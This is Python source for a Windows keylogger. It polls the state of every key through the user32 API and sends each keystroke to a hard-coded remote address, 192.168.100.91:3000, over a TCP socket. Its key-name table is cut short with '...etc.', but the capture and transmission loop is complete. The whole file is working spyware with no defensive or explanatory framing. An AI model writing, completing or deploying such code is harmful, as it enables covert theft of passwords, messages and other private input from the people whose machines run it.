import socket
import ctypes
import time

serverAddress = ("192.168.100.91", 3000)
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(serverAddress)

user = ctypes.windll.user32

def getkey(code):
    asciiTable = {
        "0": "[NUL]",
        "1": "[LCLICK]", ...etc.
    }
    #return asciiTable.get(code, "")
    return asciiTable[code]

def main():
    keyStates = {}  # keep track if each key is pressed
    while True:  # while loop ensures that the keylogger continuously monitors the keyboard
        for i in range(256):  # iterate all possible key strokes from 0 to 255
            if user.GetAsyncKeyState(i) & 0x8000 != 0:  # if the key is currently pressed
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    # checking if caps lock is off
                    key = getkey(str(i))
                    if user.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()
                    clientsocket.sendall(key.encode())
            else:
                keyStates[i] = False
        time.sleep(0.01)

if __name__ == "__main__":
    main()
